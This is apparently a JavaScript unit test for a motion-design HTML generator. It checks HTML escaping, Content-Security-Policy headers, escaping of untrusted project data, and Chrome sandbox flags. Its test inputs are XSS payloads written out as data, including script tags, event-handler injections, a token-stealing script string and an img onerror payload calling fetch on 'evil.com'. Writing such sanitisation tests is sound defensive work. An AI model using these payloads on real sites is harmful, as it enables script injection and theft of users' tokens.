const assert = require('assert');
const MotionDesigner = require('../../src/agents/motionDesigner');

console.log('🧪 Running Unit Test: Motion Designer HTML Sanitization, CSP & Sandboxing Security...');

const motionDesigner = new MotionDesigner();
const { escapeHtml, STRICT_CSP_META } = MotionDesigner;

// 1. Test escapeHtml helper function
const xssVectors = [
  { input: '<script>alert("XSS")</script>', expected: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;' },
  { input: '<img src=x onerror=fetch("http://evil.com")>', expected: '&lt;img src=x onerror=fetch(&quot;http://evil.com&quot;)&gt;' },
  { input: '"><svg onload=alert(1)>', expected: '&quot;&gt;&lt;svg onload=alert(1)&gt;' },
  { input: "'; alert('XSS'); '", expected: '&#39;; alert(&#39;XSS&#39;); &#39;' },
  { input: null, expected: '' },
  { input: undefined, expected: '' },
  { input: 42, expected: '42' }
];

for (const { input, expected } of xssVectors) {
  const result = escapeHtml(input);
  assert.strictEqual(result, expected, `escapeHtml failed for input: ${input}`);
  assert(!result.includes('<'), `Result must not contain raw <: ${result}`);
  assert(!result.includes('>'), `Result must not contain raw >: ${result}`);
}
console.log(`✅ Test 1 Passed: All ${xssVectors.length} XSS vectors cleanly sanitized by MotionDesigner.escapeHtml`);

// 2. Test Content Security Policy (CSP) presence across all motion types and archetypes
const testMotionTypes = [
  'code_walkthrough',
  'feature_card_flow',
  'outro_cta',
  'problem_solution_split'
];

const archetypes = [
  'tech_hud',
  'glassmorphic_deck',
  'kinetic_editorial',
  'minimalist_spotlight'
];

for (const motionType of testMotionTypes) {
  const html = motionDesigner.generateMotionHtml({
    motionType,
    scene: { title: 'Test Scene' },
    sourceAnalysis: { project: 'TestApp', purpose: 'Testing' },
    width: 1920,
    height: 1080
  });

  assert(html.includes('Content-Security-Policy'), `Motion type "${motionType}" must include Content-Security-Policy`);
  assert(html.includes("default-src 'none'"), `Motion type "${motionType}" CSP must specify default-src 'none'`);
  assert(html.includes("script-src 'none'"), `Motion type "${motionType}" CSP must specify script-src 'none'`);
  assert(html.includes("style-src 'unsafe-inline'"), `Motion type "${motionType}" CSP must permit style-src 'unsafe-inline' for CSS`);
}

for (const arch of archetypes) {
  const html = motionDesigner.generateMotionHtml({
    motionType: 'intro_cinematic',
    scene: { title: 'Test Scene', theme: { archetype: arch, name: 'Test Theme', glow: '#fff', bgGradient: '#000', cardBg: '#111', borderColor: '#222', accentBadge: '#333', badgeBg: '#444', primary: '#555', primaryLight: '#666', primaryDark: '#777', bgDark: '#000' } },
    sourceAnalysis: { project: 'ArchetypeApp', purpose: 'Testing Archetype' },
    width: 1920,
    height: 1080
  });

  assert(html.includes('Content-Security-Policy'), `Archetype "${arch}" must include Content-Security-Policy`);
  assert(html.includes("script-src 'none'"), `Archetype "${arch}" CSP must specify script-src 'none'`);
}
console.log('✅ Test 2 Passed: Strict Content-Security-Policy (script-src none) enforced across all motion types & archetypes');

// 3. Test HTML Escaping on Malicious Repository / Live-Site Project Data
const maliciousSourceAnalysis = {
  project: 'VulnerableApp<script>alert("owned")</script>',
  name: 'VulnerableApp<script>alert("owned")</script>',
  purpose: 'A platform with <img src=x onerror=evil()> injection',
  tagline: 'A platform with <img src=x onerror=evil()> injection',
  problemTitle: 'Bottlenecks<script>alert(1)</script>',
  problem: 'Legacy tools allow <svg/onload=alert(2)> exploits',
  techBadges: ['Node.js', '<script>stealTokens()</script>', 'Docker'],
  features: ['Feature 1', 'Exploit <b onmouseover=alert(1)>Hover</b>'],
  featureCards: [
    { title: 'SNARK Engine<script>alert(3)</script>', description: 'Proofs with <img onerror=evil()>' }
  ],
  githubData: {
    sourceTree: ['src/', 'package.json<script>alert(4)</script>', 'README.md']
  }
};

const maliciousScene = {
  title: 'Scene Title <script>alert("scene")</script>',
  overlay: {
    lowerThird: {
      subtitle: 'Subtitle <img src=x onerror=alert("sub")>'
    }
  }
};

for (const motionType of [...testMotionTypes, 'intro_cinematic']) {
  const html = motionDesigner.generateMotionHtml({
    motionType,
    scene: maliciousScene,
    sourceAnalysis: maliciousSourceAnalysis,
    width: 1920,
    height: 1080
  });

  // Verify no raw script or image tags exist in any generated template
  assert(!html.includes('<script>'), `Template "${motionType}" must not contain raw <script> tag`);
  assert(!html.includes('<img src=x onerror='), `Template "${motionType}" must not contain raw <img onerror> tag`);
  assert(!html.includes('<svg/onload='), `Template "${motionType}" must not contain raw <svg/onload> tag`);
  assert(!html.includes('<b onmouseover='), `Template "${motionType}" must not contain raw onmouseover tag`);

  // Verify safe HTML entity conversion
  assert(html.includes('&lt;script&gt;'), `Template "${motionType}" must safely entity-escape script tags`);
  assert(html.includes('&quot;'), `Template "${motionType}" must safely entity-escape quotes in data`);
}
console.log('✅ Test 3 Passed: Untrusted project data safely escaped across all templates without script execution vectors');

// 4. Test Least-Privilege Sandboxing & Launch Args
const defaultDesigner = new MotionDesigner();
const { args: defaultArgs, shouldDisableSandbox: defaultDisable } = defaultDesigner.getChromeLaunchArgs({ width: 1920, height: 1080 });

const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
if (!isRoot && process.env.CHROME_NO_SANDBOX !== 'true') {
  assert(!defaultArgs.includes('--no-sandbox'), 'Default launch args must NOT include --no-sandbox for unprivileged users');
  assert(!defaultArgs.includes('--disable-setuid-sandbox'), 'Default launch args must NOT include --disable-setuid-sandbox');
  assert.strictEqual(defaultDisable, false, 'shouldDisableSandbox must be false by default');
}

// Explicit noSandbox option
const forcedDesigner = new MotionDesigner({ noSandbox: true });
const { args: forcedArgs, shouldDisableSandbox: forcedDisable } = forcedDesigner.getChromeLaunchArgs({ width: 1920, height: 1080 });
assert(forcedArgs.includes('--no-sandbox'), 'Explicit noSandbox option must include --no-sandbox');
assert(forcedArgs.includes('--disable-setuid-sandbox'), 'Explicit noSandbox option must include --disable-setuid-sandbox');
assert.strictEqual(forcedDisable, true, 'shouldDisableSandbox must be true when noSandbox option is set');

console.log('✅ Test 4 Passed: Least-privilege sandboxing enforced, avoiding --no-sandbox unless explicitly requested or required');

console.log('\n🎉 ALL MOTION DESIGNER SECURITY & SANITIZATION TESTS PASSED!\n');
